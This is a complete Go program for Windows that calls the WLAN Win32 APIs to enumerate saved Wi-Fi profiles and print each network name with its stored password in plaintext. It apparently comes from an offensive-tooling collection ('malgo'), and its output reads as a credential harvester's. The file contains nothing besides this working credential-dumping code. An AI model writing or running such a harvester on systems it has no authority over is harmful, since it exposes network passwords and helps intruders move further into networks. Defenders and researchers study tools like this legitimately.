//go:build windows
// +build windows

// Retrieve WLAN profile passwords from Windows using Win32 API calls
package main

import (
	"encoding/xml"
	"fmt"
	"os"
	"unsafe"

	"github.com/stavinski/malgo/win32"
)

// XML marshal type for a WLAN profile
type ProfileXML struct {
	XMLName    xml.Name `xml:"WLANProfile"`
	Name       string   `xml:"name"`
	SSIDConfig struct {
		SSID struct {
			Name string `xml:"name"`
		} `xml:"SSID"`
	} `xml:"SSIDConfig"`
	MSM struct {
		Security struct {
			SharedKey struct {
				KeyMaterial string `xml:"keyMaterial"`
			} `xml:"sharedKey"`
		} `xml:"security"`
	} `xml:"MSM"`
}

func main() {
	var (
		ver           uint32
		negotiatedVer uint32
		wlanHandle    uintptr
		res           uintptr
		err           error
	)

	ver = 2
	res, _, err = win32.ProcWlanOpenHandle.Call(uintptr(ver),
		win32.NULL,
		uintptr(unsafe.Pointer(&negotiatedVer)),
		uintptr(unsafe.Pointer(&wlanHandle)))
	if res != win32.ERROR_SUCCESS {
		if res == 1062 {
			// WLAN service not running
			return
		}
		fmt.Fprint(os.Stderr, err.Error())
		return
	}
	defer win32.ProcWlanCloseHandle.Call(wlanHandle, win32.NULL)
	interfaces := &win32.WLAN_INTERFACE_INFO_LIST{}
	res, _, err = win32.ProcWlanEnumInterfaces.Call(wlanHandle, win32.NULL, uintptr(unsafe.Pointer(&interfaces)))
	if res != win32.ERROR_SUCCESS {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}
	// release interfaces memory at the end of the func
	defer win32.ProcWlanFreeMemory.Call(uintptr(unsafe.Pointer(interfaces)))
	ifaces := (*[1 << 30]win32.WLAN_INTERFACE_INFO)(unsafe.Pointer(&interfaces.InterfaceInfo[0]))[:interfaces.NumberOfItems:interfaces.NumberOfItems]
	// fmt.Printf("%v ifaces found.\n", interfaces.NumberOfItems)

	for _, iface := range ifaces {
		var profList *win32.WLAN_PROFILE_INFO_LIST
		res, _, err = win32.ProcWlanGetProfileList.Call(wlanHandle,
			uintptr(unsafe.Pointer(&iface.InterfaceGUID)),
			win32.NULL,
			uintptr(unsafe.Pointer(&profList)))
		if res != win32.ERROR_SUCCESS {
			fmt.Fprint(os.Stderr, err.Error())
			return
		}

		if profList.NumberOfItems == 0 {
			continue
		}

		fmt.Printf("[+] found %v profiles for current interface\n", profList.NumberOfItems)
		fmt.Println("[+] retrieving WLAN profiles creds...")
		profiles := (*[1 << 30]win32.WLAN_PROFILE_INFO)(unsafe.Pointer(&profList.ProfileInfo[0]))[:profList.NumberOfItems:profList.NumberOfItems]
		for _, profile := range profiles {
			var profXMLPtr *uint16
			var xmlData ProfileXML

			flags := win32.WLAN_PROFILE_GET_PLAINTEXT_KEY
			access := uint32(0)
			res, _, err = win32.ProcWlanGetProfile.Call(wlanHandle,
				uintptr(unsafe.Pointer(&iface.InterfaceGUID)),
				uintptr(unsafe.Pointer(&profile.ProfileName)),
				win32.NULL,
				uintptr(unsafe.Pointer(&profXMLPtr)),
				uintptr(unsafe.Pointer(&flags)),
				uintptr(unsafe.Pointer(&access)))
			if res != win32.ERROR_SUCCESS {
				fmt.Fprint(os.Stderr, err.Error())
				return
			}
			profXML := win32.UTF16PtrToString((*uint16)(unsafe.Pointer(profXMLPtr)))
			err = xml.Unmarshal([]byte(profXML), &xmlData)
			if err == nil {
				fmt.Printf("\t%v => %v\n", xmlData.SSIDConfig.SSID.Name, xmlData.MSM.Security.SharedKey.KeyMaterial)
			}

			// release XML string memory
			win32.ProcWlanFreeMemory.Call(uintptr(unsafe.Pointer(profXMLPtr)))
		}

		// release profList memory
		win32.ProcWlanFreeMemory.Call(uintptr(unsafe.Pointer(profList)))
	}
}
